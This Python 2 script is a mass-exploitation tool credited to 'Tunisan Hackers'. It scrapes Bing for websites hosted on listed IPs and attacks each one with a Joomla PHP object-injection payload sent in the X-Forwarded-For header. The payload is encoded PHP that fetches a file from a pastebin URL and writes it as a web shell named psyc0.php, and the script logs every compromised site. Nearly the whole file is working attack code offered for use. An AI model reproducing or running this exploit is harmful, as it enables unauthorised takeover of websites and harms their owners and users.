#############################
#            ABOUT          #
#############################
# Tunisan Hackers

#############################
#         LIBRARIES         #
#############################
import urllib2
import sys
import re
#############################
#         	CONFIG          #
#############################
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
payload = "fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/psyc0.php','w+'),file_get_contents('http://pastebin.com/raw/NMX2mUhq'));"
#############################
#         VARIABLES         #
#############################
jom_sites = []
file = ""
#############################
#          BANNER           #
#############################
def banner():
	return '''
  /$$$$$$$                            /$$$$$$$              /$$    
| $$__  $$                          | $$__  $$            | $$    
| $$  \ $$  /$$$$$$$  /$$$$$$       | $$  \ $$  /$$$$$$  /$$$$$$  
| $$$$$$$/ /$$_____/ /$$__  $$      | $$$$$$$  /$$__  $$|_  $$_/  
| $$__  $$| $$      | $$$$$$$$      | $$__  $$| $$  \ $$  | $$    
| $$  \ $$| $$      | $$_____/      | $$  \ $$| $$  | $$  | $$ /$$
| $$  | $$|  $$$$$$$|  $$$$$$$      | $$$$$$$/|  $$$$$$/  |  $$$$/
|__/  |__/ \_______/ \_______/      |_______/  \______/    \___/  
                                                                  
                                                                  
                                                                  
                                                      ----                         
    Psyco_Miste & Yassinox_tn                                                            
	'''
#############################
#         FUNCTIONS         #
#############################
def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
def prepare(url, ua):
	try:
		global user_agent
		headers = {
			'User-Agent' : user_agent,
			'x-forwarded-for' : ua
		}
		cookies = urllib2.Request(url, headers=headers)
		result = urllib2.urlopen(cookies)
		cookieJar = result.info().getheader('Set-Cookie')
		injection = urllib2.Request(url, headers=headers)
		injection.add_header('Cookie', cookieJar)
		urllib2.urlopen(injection)
	except:
		pass
def toCharCode(string):
	try:
		encoded = ""
		for char in string:
			encoded += "chr({0}).".format(ord(char))
		return encoded[:-1]
	except:
		pass
def generate(payload):
    php_payload = "eval({0})".format(toCharCode(payload))
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
    return exploit_template
def exploit(url):
	try:
		global payload
		payload_generated = generate(payload)
		prepare(url, payload_generated)
		tester = urllib2.urlopen(str(url)+"/psyc0.php").read()
		if("uploadedfile" in tester):
			print "[+] Injected : "+str(url)
			with open("psyc0.txt", "a") as f:
				f.write(url+"/psyc0.php\n")
	except:
		pass
def jmgrabber(s):
		global jom_sites
		jom_list = []
		page = 1
		while page <= 101:
			bing = "http://www.bing.com/search?q=ip%3A"+s+"+&count=50&first="+str(page)
			openbing  = urllib2.urlopen(bing)
			readbing = openbing.read()
			findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
			for i in range(len(findwebs)):
				allnoclean = findwebs[i]
				findall1 = re.findall('http://(.*?)/', allnoclean)
				for idx, item in enumerate(findall1):
					if 'www' not in item:
							findall1[idx]  = 'http://www.' + item + '/'
					else:	
     						findall1[idx]  = 'http://' + item + '/'
				jom_list.extend(findall1)
			page = page + 10
		final =  unique(jom_list)
		jom_sites.extend(final)
		print "[!] Grabbed "+str(len(jom_sites))+" websites from : "+str(s)
#############################
#         	 MAIN           #
#############################
try:
	file = open(sys.argv[1]).readlines()
except :
	print "Usage : "+str(sys.argv[0])+" list.txt"
	sys.exit(1)
if(len(file) > 0):
	print banner()
	print "[!] Extracting websites"
	for _ip in file:
		_ip = _ip.rstrip()
		jmgrabber(_ip)
	print "[!] Running the attack !"
	for _site in jom_sites:
		exploit(_site)
